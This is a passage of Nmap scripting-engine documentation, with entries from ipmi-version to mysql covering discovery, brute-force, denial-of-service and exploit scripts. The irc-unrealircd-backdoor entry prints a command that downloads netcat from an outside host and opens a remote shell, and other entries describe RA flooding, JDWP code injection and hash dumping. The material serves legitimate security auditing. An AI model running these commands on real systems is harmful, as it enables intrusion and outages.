    through the use of cipher zero.

ipmi-version
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ipmi-version.html
    Performs IPMI Information Discovery through Channel Auth probes.

ipv6-multicast-mld-list
Categories: broadcast discovery
https://nmap.org/nsedoc/scripts/ipv6-multicast-mld-list.html
  Uses Multicast Listener Discovery to list the multicast addresses subscribed to
  by IPv6 multicast listeners on the link-local scope. Addresses in the IANA IPv6
  Multicast Address Space Registry have their descriptions listed.

ipv6-node-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ipv6-node-info.html
  Obtains hostnames, IPv4 and IPv6 addresses through IPv6 Node Information Queries.

  IPv6 Node Information Queries are defined in RFC 4620. There are three
  useful types of queries:
  * qtype=2: Node Name
  * qtype=3: Node Addresses
  * qtype=4: IPv4 Addresses

  Some operating systems (Mac OS X and OpenBSD) return hostnames in
  response to qtype=4, IPv4 Addresses. In this case, the hostnames are still
  shown in the "IPv4 addresses" output row, but are prefixed by "(actually
  hostnames)".

ipv6-ra-flood
Categories: dos intrusive
https://nmap.org/nsedoc/scripts/ipv6-ra-flood.html
  Generates a flood of Router Advertisements (RA) with random source MAC
  addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration
  enabled by default (every major OS), will start to compute IPv6 suffix and
  update their routing table to reflect the accepted announcement. This will
  cause 100% CPU usage on Windows and platforms, preventing to process other
  application requests.

  Vulnerable platforms:
  * All Cisco IOS ASA with firmware < November 2010
  * All Netscreen versions supporting IPv6
  * Windows 2000/XP/2003/Vista/7/2008/8/2012
  * All FreeBSD versions
  * All NetBSD versions
  * All Solaris/Illumos versions

  Security advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt

  WARNING: This script is dangerous and is very likely to bring down a server or
  network appliance.  It should not be run in a production environment unless you
  (and, more importantly, the business) understand the risks!

  Additional documents: https://tools.ietf.org/rfc/rfc6104.txt

irc-botnet-channels
Categories: discovery vuln safe
https://nmap.org/nsedoc/scripts/irc-botnet-channels.html
  Checks an IRC server for channels that are commonly used by malicious botnets.

  Control the list of channel names with the <code>irc-botnet-channels.channels</code>
  script argument. The default list of channels is
  * loic
  * Agobot
  * Slackbot
  * Mytob
  * Rbot
  * SdBot
  * poebot
  * IRCBot
  * VanBot
  * MPack
  * Storm
  * GTbot
  * Spybot
  * Phatbot
  * Wargbot
  * RxBot

irc-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/irc-brute.html
  Performs brute force password auditing against IRC (Internet Relay Chat) servers.

irc-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/irc-info.html
  Gathers information from an IRC server.

  It uses STATS, LUSERS, and other queries to obtain this information.

irc-sasl-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/irc-sasl-brute.html
  Performs brute force password auditing against IRC (Internet Relay Chat) servers supporting SASL authentication.

irc-unrealircd-backdoor
Categories: exploit intrusive malware vuln
https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html
  Checks if an IRC server is backdoored by running a time-based command (ping)
  and checking how long it takes to respond.

  The <code>irc-unrealircd-backdoor.command</code> script argument can be used to
  run an arbitrary command on the remote system. Because of the nature of
  this vulnerability (the output is never returned) we have no way of
  getting the output of the command. It can, however, be used to start a
  netcat listener as demonstrated here:
  <code>
    $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
    $ ncat -vv localhost 4444
    Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )
    Ncat: Connected to 127.0.0.1:4444.
    pwd
    /home/ron/downloads/Unreal3.2-bad
    whoami
    ron
  </code>

  Metasploit can also be used to exploit this vulnerability.

  In addition to running arbitrary commands, the
  <code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which
  simply kills the UnrealIRCd process.


  Reference:
  * http://seclists.org/fulldisclosure/2010/Jun/277
  * http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
  * http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor

iscsi-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/iscsi-brute.html
  Performs brute force password auditing against iSCSI targets.

iscsi-info
Categories: default safe discovery
https://nmap.org/nsedoc/scripts/iscsi-info.html
  Collects and displays information from remote iSCSI targets.

isns-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/isns-info.html
  Lists portals and iSCSI nodes registered with the Internet Storage Name
  Service (iSNS).

jdwp-exec
Categories: exploit intrusive
https://nmap.org/nsedoc/scripts/jdwp-exec.html
  Attempts to exploit java's remote debugging port. When remote debugging
  port is left open, it is possible to inject java bytecode and achieve
  remote code execution.  This script abuses this to inject and execute
  a Java class file that executes the supplied shell command and returns
  its output.

  The script injects the JDWPSystemInfo class from
  nselib/jdwp-class/ and executes its run() method which
  accepts a shell command as its argument.


jdwp-info
Categories: default safe discovery
https://nmap.org/nsedoc/scripts/jdwp-info.html
  Attempts to exploit java's remote debugging port.  When remote
  debugging port is left open, it is possible to inject java bytecode
  and achieve remote code execution.  This script injects and execute a
  Java class file that returns remote system information.

jdwp-inject
Categories: exploit intrusive
https://nmap.org/nsedoc/scripts/jdwp-inject.html
  Attempts to exploit java's remote debugging port.  When remote debugging port
  is left open, it is possible to inject  java bytecode and achieve remote code
  execution.  This script allows injection of arbitrary class files.

  After injection, class' run() method is executed.
  Method run() has no parameters, and is expected to return a string.

  You must specify your own .class file to inject by <code>filename</code> argument.
  See nselib/data/jdwp-class/README for more.

jdwp-version
Categories: version
https://nmap.org/nsedoc/scripts/jdwp-version.html
  Detects the Java Debug Wire Protocol. This protocol is used by Java programs
  to be debugged via the network. It should not be open to the public Internet,
  as it does not provide any security against malicious attackers who can inject
  their own bytecode into the debugged process.

  Documentation for JDWP is available at
  http://java.sun.com/javase/6/docs/technotes/guides/jpda/jdwp-spec.html

knx-gateway-discover
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/knx-gateway-discover.html
  Discovers KNX gateways by sending a KNX Search Request to the multicast address
  224.0.23.12 including a UDP payload with destination port 3671. KNX gateways
  will respond with a KNX Search Response including various information about the
  gateway, such as KNX address and supported services.

  Further information:
    * DIN EN 13321-2
    * http://www.knx.org/

knx-gateway-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/knx-gateway-info.html
  Identifies a KNX gateway on UDP port 3671 by sending a KNX Description Request.

  Further information:
    * DIN EN 13321-2
    * http://www.knx.org/

krb5-enum-users
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/krb5-enum-users.html
  Discovers valid usernames by brute force querying likely usernames against a Kerberos service.
  When an invalid username is requested the server will respond using the
  Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine
  that the user name was invalid. Valid user names will illicit either the
  TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling
  that the user is required to perform pre authentication.

  The script should work against Active Directory and ?
  It needs a valid Kerberos REALM in order to operate.

ldap-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/ldap-brute.html
  Attempts to brute-force LDAP authentication. By default
  it uses the built-in username and password lists. In order to use your
  own lists use the <code>userdb</code> and <code>passdb</code> script arguments.

  This script does not make any attempt to prevent account lockout!
  If the number of passwords in the dictionary exceed the amount of
  allowed tries, accounts will be locked out. This usually happens
  very quickly.

  Authenticating against Active Directory using LDAP does not use the
  Windows user name but the user accounts distinguished name. LDAP on Windows
  2003 allows authentication using a simple user name rather than using the
  fully distinguished name. E.g., "Patrik Karlsson" vs.
  "cn=Patrik Karlsson,cn=Users,dc=cqure,dc=net"
  This type of authentication is not supported on e.g. OpenLDAP.

  This script uses some AD-specific support and optimizations:
  * LDAP on Windows 2003/2008 reports different error messages depending on whether an account exists or not. If the script receives an error indicating that the username does not exist it simply stops guessing passwords for this account and moves on to the next.
  * The script attempts to authenticate with the username only if no LDAP base is specified. The benefit of authenticating this way is that the LDAP path of each account does not need to be known in advance as it's looked up by the server.  This technique will only find a match if the account Display Name matches the username being attempted.

ldap-novell-getpass
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ldap-novell-getpass.html
  Attempts to retrieve the Novell Universal Password for a user. You
  must already have (and include in script arguments) the username and password for an eDirectory server
  administrative account.

ldap-rootdse
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ldap-rootdse.html
  Retrieves the LDAP root DSA-specific Entry (DSE)

ldap-search
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ldap-search.html
  Attempts to perform an LDAP search and returns all matches.

  If no username and password is supplied to the script the Nmap registry
  is consulted. If the <code>ldap-brute</code> script has been selected
  and it found a valid account, this account will be used. If not
  anonymous bind will be used as a last attempt.

lexmark-config
Categories: discovery safe
https://nmap.org/nsedoc/scripts/lexmark-config.html
  Retrieves configuration information from a Lexmark S300-S400 printer.

  The Lexmark S302 responds to the NTPRequest version probe with its
  configuration. The response decodes as mDNS, so the request was modified
  to resemble an mDNS request as close as possible. However, the port
  (9100/udp) is listed as something completely different (HBN3) in
  documentation from Lexmark. See
  http://www.lexmark.com/vgn/images/portal/Security%20Features%20of%20Lexmark%20MFPs%20v1_1.pdf.

llmnr-resolve
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/llmnr-resolve.html
  Resolves a hostname by using the LLMNR (Link-Local Multicast Name Resolution) protocol.

  The script works by sending a LLMNR Standard Query containing the hostname to
  the 5355 UDP port on the 224.0.0.252 multicast address. It listens for any
  LLMNR responses that are sent to the local machine with a 5355 UDP source port.
  A hostname to resolve must be provided.

  For more information, see:
  * http://technet.microsoft.com/en-us/library/bb878128.aspx

lltd-discovery
Categories: broadcast discovery safe
https://nmap.org/nsedoc/scripts/lltd-discovery.html
  Uses the Microsoft LLTD protocol to discover hosts on a local network.

  For more information on the LLTD protocol please refer to
  http://www.microsoft.com/whdc/connect/Rally/LLTD-spec.mspx

lu-enum
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/lu-enum.html
  Attempts to enumerate Logical Units (LU) of TN3270E servers.

  When connecting to a TN3270E server you are assigned a Logical Unit (LU) or you can tell
  the TN3270E server which LU you'd like to use. Typically TN3270E servers are configured to
  give you an LU from a pool of LUs. They can also have LUs set to take you to a specific
  application. This script attempts to guess valid LUs that bypass the default LUs you are
  assigned. For example, if a TN3270E server sends you straight to TPX you could use this
  script to find LUs that take you to TSO, CICS, etc.

maxdb-info
Categories: default version safe
https://nmap.org/nsedoc/scripts/maxdb-info.html
  Retrieves version and database information from a SAP Max DB database.

mcafee-epo-agent
Categories: version safe
https://nmap.org/nsedoc/scripts/mcafee-epo-agent.html
  Check if ePO agent is running on port 8081 or port identified as ePO Agent port.

membase-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/membase-brute.html
  Performs brute force password auditing against Couchbase Membase servers.

membase-http-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/membase-http-info.html
  Retrieves information (hostname, OS, uptime, etc.) from the CouchBase
  Web Administration port.  The information retrieved by this script
  does not require any credentials.

memcached-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/memcached-info.html
  Retrieves information (including system architecture, process ID, and
  server time) from distributed memory object caching system memcached.

metasploit-info
Categories: intrusive safe
https://nmap.org/nsedoc/scripts/metasploit-info.html
  Gathers info from the Metasploit rpc service.  It requires a valid login pair.
  After authentication it tries to determine Metasploit version and deduce the OS
  type.  Then it creates a new console and executes few commands to get
  additional info.

  References:
  * http://wiki.msgpack.org/display/MSGPACK/Format+specification
  * https://community.rapid7.com/docs/DOC-1516 Metasploit RPC API Guide

metasploit-msgrpc-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/metasploit-msgrpc-brute.html
  Performs brute force username and password auditing against
  Metasploit msgrpc interface.


metasploit-xmlrpc-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/metasploit-xmlrpc-brute.html
  Performs brute force password auditing against a Metasploit RPC server using the XMLRPC protocol.

mikrotik-routeros-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/mikrotik-routeros-brute.html
  Performs brute force password auditing against Mikrotik RouterOS devices with the API RouterOS interface enabled.

  Additional information:
  * http://wiki.mikrotik.com/wiki/API

mmouse-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/mmouse-brute.html
  Performs brute force password auditing against the RPA Tech Mobile Mouse
  servers.

  The Mobile Mouse server runs on OS X, Windows and Linux and enables remote
  control of the keyboard and mouse from an iOS device. For more information:
  http://mobilemouse.com/

mmouse-exec
Categories: intrusive
https://nmap.org/nsedoc/scripts/mmouse-exec.html
  Connects to an RPA Tech Mobile Mouse server, starts an application and
  sends a sequence of keys to it. Any application that the user has
  access to can be started and the key sequence is sent to the
  application after it has been started.

  The Mobile Mouse server runs on OS X, Windows and Linux and enables remote
  control of the keyboard and mouse from an iOS device. For more information:
  http://mobilemouse.com/

  The script has only been tested against OS X and will detect the remote OS
  and abort unless the OS is detected as Mac.

modbus-discover
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/modbus-discover.html
  Enumerates SCADA Modbus slave ids (sids) and collects their device information.

  Modbus is one of the popular SCADA protocols. This script does Modbus device
  information disclosure. It tries to find legal sids (slave ids) of Modbus
  devices and to get additional information about the vendor and firmware. This
  script is improvement of modscan python utility written by Mark Bristow.

  Information about MODBUS protocol and security issues:
  * MODBUS application protocol specification:  http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf
  * Defcon 16 Modscan presentation: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-bristow.pdf
  * Modscan utility is hosted at google code: http://code.google.com/p/modscan/

mongodb-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/mongodb-brute.html
  Performs brute force password auditing against the MongoDB database.

mongodb-databases
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/mongodb-databases.html
  Attempts to get a list of tables from a MongoDB database.

mongodb-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/mongodb-info.html
  Attempts to get build info and server status from a MongoDB database.

mqtt-subscribe
Categories: safe discovery version
https://nmap.org/nsedoc/scripts/mqtt-subscribe.html
  Dumps message traffic from MQTT brokers.

  This script establishes a connection to an MQTT broker and subscribes
  to the requested topics. The default topics have been chosen to
  receive system information and all messages from other clients. This
  allows Nmap, to listen to all messages being published by clients to
  the MQTT broker.

  For additional information:
  * https://en.wikipedia.org/wiki/MQTT
  * https://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html

mrinfo
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/mrinfo.html
  Queries targets for multicast routing information.

  This works by sending a DVMRP Ask Neighbors 2 request to the target and
  listening for DVMRP Neighbors 2 responses that are sent back and which contain
  local addresses and the multicast neighbors on each interface of the target. If
  no specific target is specified, the request will be sent to the 224.0.0.1 All
  Hosts multicast address.

  This script is similar somehow to the mrinfo utility included with Windows and
  Cisco IOS.

ms-sql-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/ms-sql-brute.html
  Performs password guessing against Microsoft SQL Server (ms-sql). Works best in
  conjunction with the <code>broadcast-ms-sql-discover</code> script.

  SQL Server credentials required: No  (will not benefit from <code>mssql.username</code> & <code>mssql.password</code>).

  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code> or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code> and <code>mssql.instance-port</code> script arguments are NOT used.

  WARNING: SQL Server 2005 and later versions include support for account lockout
  policies (which are enforced on a per-user basis). If an account is locked out,
  the script will stop running for that instance, unless the
  <code>ms-sql-brute.ignore-lockout</code> argument is used.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-config
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-config.html
  Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,
  and configuration settings.

  SQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>
  and/or <code>mssql.username</code> & <code>mssql.password</code>)
  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only
  if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  and <code>mssql.instance-port</code> script arguments are NOT used.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-dac
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-dac.html
  Queries the Microsoft SQL Browser service for the DAC (Dedicated Admin
  Connection) port of a given (or all) SQL Server instance. The DAC port
  is used to connect to the database instance when normal connection
  attempts fail, for example, when server is hanging, out of memory or
  in other bad states. In addition, the DAC port provides an admin with
  access to system objects otherwise not accessible over normal
  connections.

  The DAC feature is accessible on the loopback adapter per default, but
  can be activated for remote access by setting the 'remote admin
  connection' configuration value to 1. In some cases, when DAC has been
  remotely enabled but later disabled, the sql browser service may
  incorrectly report it as available. The script therefore attempts to
  connect to the reported port in order to verify whether it's
  accessible or not.

ms-sql-dump-hashes
Categories: auth discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-dump-hashes.html
  Dumps the password hashes from an MS-SQL server in a format suitable for
  cracking by tools such as John-the-ripper. In order to do so the user
  needs to have the appropriate DB privileges.

  Credentials passed as script arguments take precedence over credentials
  discovered by other scripts.

ms-sql-empty-password
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/ms-sql-empty-password.html
  Attempts to authenticate to Microsoft SQL Servers using an empty password for
  the sysadmin (sa) account.

  SQL Server credentials required: No (will not benefit from
  <code>mssql.username</code> & <code>mssql.password</code>).
  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only
  if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  and <code>mssql.instance-port</code> script arguments are NOT used.

  WARNING: SQL Server 2005 and later versions include support for account lockout
  policies (which are enforced on a per-user basis).

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-hasdbaccess
Categories: auth discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-hasdbaccess.html
  Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user has
  access to.

  SQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>
  and/or <code>mssql.username</code> & <code>mssql.password</code>)
  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only
  if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  and <code>mssql.instance-port</code> script arguments are NOT used.

  The script needs an account with the sysadmin server role to work.

  When run, the script iterates over the credentials and attempts to run
  the command for each available set of credentials.

  NOTE: The "owner" field in the results will be truncated at 20 characters. This
  is a limitation of the <code>sp_MShasdbaccess</code> stored procedure that the
  script uses.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-info.html
  Attempts to determine configuration and version information for Microsoft SQL
  Server instances.

  SQL Server credentials required: No (will not benefit from
  <code>mssql.username</code> & <code>mssql.password</code>).
  Run criteria:
  * Host script: Will always run.
  * Port script: N/A

  NOTE: Unlike previous versions, this script will NOT attempt to log in to SQL
  Server instances. Blank passwords can be checked using the
  <code>ms-sql-empty-password</code> script. E.g.:
  <code>nmap -sn --script ms-sql-empty-password --script-args mssql.instance-all <host></code>

  The script uses two means of getting version information for SQL Server instances:
  * Querying the SQL Server Browser service, which runs by default on UDP port
  1434 on servers that have SQL Server 2000 or later installed. However, this
  service may be disabled without affecting the functionality of the instances.
  Additionally, it provides imprecise version information.
  * Sending a probe to the instance, causing the instance to respond with
  information including the exact version number. This is the same method that
  Nmap uses for service versioning; however, this script can also do the same for
  instances accessible via Windows named pipes, and can target all of the
  instances listed by the SQL Server Browser service.

  In the event that the script can connect to the SQL Server Browser service
  (UDP 1434) but is unable to connect directly to the instance to obtain more
  accurate version information (because ports are blocked or the <code>mssql.scanned-ports-only</code>
  argument has been used), the script will rely only upon the version number
  provided by the SQL Server Browser/Monitor, which has the following limitations:
  * For SQL Server 2000 and SQL Server 7.0 instances, the RTM version number is
  always given, regardless of any service packs or patches installed.
  * For SQL Server 2005 and later, the version number will reflect the service
  pack installed, but the script will not be able to tell whether patches have
  been installed.

  Where possible, the script will determine major version numbers, service pack
  levels and whether patches have been installed. However, in cases where
  particular determinations can not be made, the script will report only what can
  be confirmed.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-ntlm-info.html
  This script enumerates information from remote Microsoft SQL services with NTLM
  authentication enabled.

  Sending a MS-TDS NTLM authentication request with an invalid domain and null
  credentials will cause the remote service to respond with a NTLMSSP message
  disclosing information to include NetBIOS, DNS, and OS build version.

ms-sql-query
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-query.html
  Runs a query against Microsoft SQL Server (ms-sql).

  SQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>
  and/or <code>mssql.username</code> & <code>mssql.password</code>)
  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only
  if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  and <code>mssql.instance-port</code> script arguments are NOT used.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-tables
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ms-sql-tables.html
  Queries Microsoft SQL Server (ms-sql) for a list of tables per database.

  SQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>
  and/or <code>mssql.username</code> & <code>mssql.password</code>)
  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only
  if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  and <code>mssql.instance-port</code> script arguments are NOT used.

  The sysdatabase table should be accessible by more or less everyone.

  Once we have a list of databases we iterate over it and attempt to extract
  table names. In order for this to succeed we need to have either
  sysadmin privileges or an account with access to the db. So, each
  database we successfully enumerate tables from we mark as finished, then
  iterate over known user accounts until either we have exhausted the users
  or found all tables in all the databases.

  System databases are excluded.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

ms-sql-xp-cmdshell
Categories: intrusive
https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html
  Attempts to run a command using the command shell of Microsoft SQL
  Server (ms-sql).

  SQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>
  and/or <code>mssql.username</code> & <code>mssql.password</code>)
  Run criteria:
  * Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
  * Port script: Will run against any services identified as SQL Servers, but only
  if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
  and <code>mssql.instance-port</code> script arguments are NOT used.

  The script needs an account with the sysadmin server role to work.

  When run, the script iterates over the credentials and attempts to run
  the command until either all credentials are exhausted or until the
  command is executed.

  NOTE: Communication with instances via named pipes depends on the <code>smb</code>
  library. To communicate with (and possibly to discover) instances via named pipes,
  the host must have at least one SMB port (e.g. TCP 445) that was scanned and
  found to be open. Additionally, named pipe connections may require Windows
  authentication to connect to the Windows host (via SMB) in addition to the
  authentication required to connect to the SQL Server instances itself. See the
  documentation and arguments for the <code>smb</code> library for more information.

  NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
  with ports that were not included in the port list for the Nmap scan. This can
  be disabled using the <code>mssql.scanned-ports-only</code> script argument.

msrpc-enum
Categories: safe discovery
https://nmap.org/nsedoc/scripts/msrpc-enum.html
  Queries an MSRPC endpoint mapper for a list of mapped
  services and displays the gathered information.

  As it is using smb library, you can specify optional
  username and password to use.

  Script works much like Microsoft's rpcdump tool
  or dcedump tool from SPIKE fuzzer.

mtrace
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/mtrace.html
  Queries for the multicast path from a source to a destination host.

  This works by sending an IGMP Traceroute Query and listening for IGMP
  Traceroute responses. The Traceroute Query is sent to the first hop and
  contains information about source, destination and multicast group addresses.
  First hop defaults to the multicast All routers address. The default multicast
  group address is 0.0.0.0 and the default destination is our own host address. A
  source address must be provided. The responses are parsed to get interesting
  information about interface addresses, used protocols and error codes.

  This is similar to the mtrace utility provided in Cisco IOS.

murmur-version
Categories: version
https://nmap.org/nsedoc/scripts/murmur-version.html
  Detects the Murmur service (server for the Mumble voice communication
  client) versions 1.2.X.

  The Murmur server listens on a TCP (control) and a UDP (voice) port
  with the same port number. This script activates on both a TCP and UDP
  port version scan. In both cases probe data is sent only to the UDP
  port because it allows for a simple and informative ping command.

  The single probe will report on the server version, current user
  count, maximum users allowed on the server, and bandwidth used for
  voice communication. It is used by the Mumble client to ping known
  Murmur servers.

  The IP address from which service detection is being ran will most
  likely be temporarily banned by the target Murmur server due to
  multiple incorrect handshakes (Nmap service probes). This ban makes
  identifying the service via TCP impossible in practice, but does not
  affect the UDP probe used by this script.

  It is possible to get a corrupt user count (usually +1) when doing a
  TCP service scan due to previous service probe connections affecting
  the server.

  See http://mumble.sourceforge.net/Protocol.

mysql-audit
Categories: discovery safe
https://nmap.org/nsedoc/scripts/mysql-audit.html
  Audits MySQL database server security configuration against parts of
  the CIS MySQL v1.0.2 benchmark (the engine can be used for other MySQL
  audits by creating appropriate audit files).

mysql-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/mysql-brute.html
  Performs password guessing against MySQL.

mysql-databases
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/mysql-databases.html
  Attempts to list all databases on a MySQL server.

mysql-dump-hashes
Categories: auth discovery safe
https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html
